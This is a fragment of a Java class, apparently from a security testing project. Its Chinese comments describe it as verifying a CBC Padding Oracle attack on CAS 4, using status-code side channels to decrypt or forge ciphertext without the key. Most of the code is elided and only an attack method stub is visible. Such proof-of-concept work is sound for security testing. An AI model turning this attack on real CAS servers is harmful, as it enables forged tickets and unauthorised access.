/*
 * [业务问题]: CAS 4 版本的 Padding Oracle 攻击验证。
 * [实现逻辑]: 利用 CBC 模式的 Padding Oracle 漏洞，在不知道密钥的情况下，通过侧信道（响应状态码差异）逐步解密或加密数据。
 */
package com.security.bug.cas;

import com.security.bug.cas.support.CiphertextHeader;
import com.security.bug.cas.support.PaddingOracleCBCForShiro;
import com.security.bug.cas.support.PaddingOracleCBCForShiro.CBCResult;
...
public class CasPaddingOracleCBC {
    ...
    private void attack(byte[] bytes) throws UnsupportedEncodingException {
        ...
        System.arraycopy(cbcResult.getCrypt(), 0, newOriginBytes, ciphertextHeader.encode().length,
